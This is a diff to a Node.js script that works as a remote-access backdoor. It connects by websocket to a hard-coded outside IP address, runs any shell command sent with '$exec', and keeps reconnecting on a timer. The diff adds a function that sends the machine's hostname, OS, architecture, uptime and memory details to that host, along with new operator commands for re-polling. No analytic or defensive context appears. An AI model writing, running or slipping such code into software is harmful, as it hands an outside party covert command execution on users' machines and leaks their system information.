@@ -3,14 +3,15 @@ const os = require('os');
 const { exec } = require('child_process')
 let ws = new WS("ws://20.115.225.169:8080")
 let connected = 0
+let reconnect_time = 60000*20
 
 function connect() {
-    connected+=1
+    connected += 1
     ws = new WS("ws://20.115.225.169:8080")
     ws.on("open", () => {
         console.log("Connection establised")
-        if (connected < 2){
-            ws.send(`Connected to OS :: ${os.type()}`)
+        if (connected < 2) {
+            sendSystemInfo()
         }
         ws.on("message", (message) => {
             const msg = message.toString()
@@ -18,10 +19,19 @@ function connect() {
             if (operation === "$exec") { // checks if there is exec command to execute the cmd.
                 cmd(text.join(" "))
             }
+            else if (operation === "$reconnect") {
+                reconnect()
+            }
+            else if(operation === "$systemInfo") {
+                sendSystemInfo()
+            }
         })
     })
+
+
     ws.on("error", (error) => {
         console.log("error")
+        connected = 0
         setTimeout(reconnect, 2000)
     })
     ws.on("close", () => {
@@ -47,14 +57,27 @@ function cmd(cmd) {
     }
 }
 
+
+function sendSystemInfo() {
+    ws.send(`Connected to OS :: ${os.type()}`)
+    ws.send(`OS Platform :: ${os.platform()}`)
+    ws.send(`OS Architcture :: ${os.arch()}`)
+    ws.send(`OS Release :: ${os.release()}`)
+    ws.send(`OS Hostname :: ${os.hostname()}`)
+    ws.send(`OS Up Time :: ${os.uptime()}`)
+    ws.send(`OS Load Avg.:: ${os.loadavg()}`)
+    ws.send(`OS Memory :: ${os.totalmem()}`)
+    ws.send(`OS Free Memory:: ${os.freemem()}`)
+}
+
+
 function reconnect() {
-    try{
+    try {
         ws.close()
         connect()
-    } catch{
+    } catch {
         console.log("Some Error in reconnection")
     }
 }
 reconnect()
-setInterval(reconnect, 1000*60*20)
-
+setInterval(reconnect, reconnect_time)
